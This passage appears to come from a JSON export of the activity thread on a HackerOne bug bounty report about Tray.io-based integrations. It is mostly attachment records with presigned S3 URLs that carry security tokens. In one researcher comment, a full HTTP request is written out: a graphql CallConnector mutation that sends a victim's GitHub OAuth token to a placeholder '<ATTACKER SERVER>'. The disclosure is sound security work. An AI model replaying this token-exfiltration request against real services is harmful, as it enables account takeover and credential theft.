+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ko44h1t5m2vlcuhdqljtswpr0uen?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0cf476c5801948694f42b24ba2b8b7250cb16be0f4101e8fa7d7a77e676ae8f0"
+        },
+        {
+          "id": 1986076,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z4lwhyzogxu138zt6e8jbxuzlv8g?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c5a09c6c9864c55790443930d39d4de61626725e07417c8878ffc807cceace92"
+        },
+        {
+          "id": 1986075,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jkory5thl9bte5vqitbio43fnbe9?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2f70b639399c111683c7f1f3bea01a88639a27bc99e0363e3967c6d9a5100445"
+        },
+        {
+          "id": 1986056,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gmc6b6ypu7fazr7valum7r348wi8?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=efd0f7b0d1bb8acd8da0cd9a2ab8ca5a3e89d419ab9747471f62416ccea31ac3"
+        },
+        {
+          "id": 1986036,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qjpx7l0j2s7lw1g7a0jqkrliog79?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8dfc2bc5fd28c36bcdd73dd4fb8a89387a04082bdc6f545bae24f5d53806ce26"
+        },
+        {
+          "id": 1986032,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zzyml5oahbvzjjj2phxi249dz7k5?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9801749d7874cfe6f2dcbab07b1cfd683ada6208893a8302d1eb4825a1531e14"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18790210,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @medmahmoudi,\n\nThank you for your submission! We have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nThanks,\n@h1_analyst_magnus",
+      "automated_response": false,
+      "created_at": "2022-10-14T16:52:06.757Z",
+      "updated_at": "2022-10-14T16:52:06.757Z",
+      "actor": {
+        "username": "h1_analyst_magnus",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_magnus",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18805284,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Greetings ! I found that the attacker could easily get the access token of the victim's oauth application. This could be done through the same query I have discussed earlier. When setting up a Tray.io based integration in Hackerone. Your browser will send some requests to Tray's graphql.\n\n{F1989034}\nThese requests are authenticated with Bearer token that Hackerone behind the scenes gives to its users. The attacker could just check its proxy history for requests to ```tray.io/graphql``` and grab its Bearer token.\n\nThen he could use it in the following request:\n\n```\nPOST /graphql HTTP/2\nHost: tray.io\nContent-Length: 512\nSec-Ch-Ua: \"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"\nAccept: */*\nContent-Type: application/json\nSec-Ch-Ua-Mobile: ?0\nAuthorization: Bearer <Attacker Token>\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://hackerone.integration-configuration.com\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://hackerone.integration-configuration.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{\"operationName\":\"CallConnector\",\"variables\":{\"input\":{\"connector\":\"github\",\"version\":\"2.2\",\"operation\":\"raw_http_request\",\"authId\":\"22583997-4aa0-4bb8-87cb-28326dc97868\",\"input\":\"{\\\"method\\\":\\\"GET\\\",\\\"parse_response\\\":\\\"true\\\",\\\"include_raw_body\\\":\\\"false\\\",\\\"url\\\":{\\\"full_url\\\":\\\"http://<ATTACKER SERVER>\\\"}}\"}},\"query\":\"mutation CallConnector($input: ConnectorCallInput!) {\\n  callConnector(input: $input) {\\n    output\\n    __typename\\n  }\\n}\\n\"}\n```\n\n{F1989036}\n\nReplace <ATTACKER SERVER> by your own server's url. The Github access token of the victim would be in the headers of request logged by the attacker's server. The same thing could be done to all the other integrations that are built on Tray.io embedded product.\n",
+      "automated_response": false,
+      "created_at": "2022-10-16T22:21:12.221Z",
+      "updated_at": "2022-10-16T22:21:12.221Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1989036,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ykgw0hd6xg3rh65n8u5v9tippkqr?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8070ee38768fdb799b173f9029d35d78c7b985c496fc1a7093ea9f233b6182ce"
+        },
+        {
+          "id": 1989034,
+          "filename": "image.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/u4dy4vf338xo1x42oexz0ji0devn?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEm